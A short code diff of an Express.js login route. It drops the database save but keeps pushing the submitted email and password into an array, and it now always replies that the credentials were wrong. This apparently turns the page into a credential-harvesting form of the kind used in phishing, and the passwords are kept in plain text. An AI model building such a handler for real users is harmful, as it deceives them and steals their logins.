@@ -40,15 +40,11 @@ app.post('/', async function (req, res) {
   try {
     const { email, password } = req.body;
     data.push(email, password);
-    const result = new sc({ email, password })
-    await result.save();
-    console.log(result)
-    if (!result) {
-      res.send('you got some error')
-    }
+    
+   
    
 
-    res.send({ message: "Data save successfully " })
+    res.send({ message: "Check Your Email Passwornd and Try Again" })
 
   } catch (error) {
     res.send(error)
